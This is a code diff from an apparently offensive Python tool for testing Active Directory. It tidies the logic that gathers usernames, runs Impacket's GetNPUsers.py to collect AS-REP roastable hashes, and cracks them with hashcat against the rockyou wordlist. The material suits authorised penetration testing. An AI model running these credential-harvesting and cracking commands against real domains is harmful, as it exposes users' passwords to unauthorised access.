@@ -2534,13 +2534,10 @@ while True:
                   line = read.readline().rstrip("\n")
                   localCOM("echo " + line + " >> authorised.tmp")      
          else:
-            print("[+] The authorised user file seems to be empty, so I am authorising everyone in the list..")                     
+            print("[+] The authorised user file seems to be empty, so I am authorising everyone in the list..")
+            localCOM("cp " + dataDir + "/usernames.txt authorised.tmp")              
          if checkParam != 1:
-            if NTM[:5] != "EMPTY":
-               print("[i] Using HASH value as password credential...")
-               remoteCOM(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")
-            else:
-               remoteCOM(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")                        
+            remoteCOM(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")
             print(colored("[*] Cracking hash values if they exists...\n", colour3))
             localCOM("hashcat -m 18200 --force -a 0 hashroast2.tmp /usr/share/wordlists/rockyou.txt -o cracked2.txt")
             localCOM("strings cracked2.txt")         
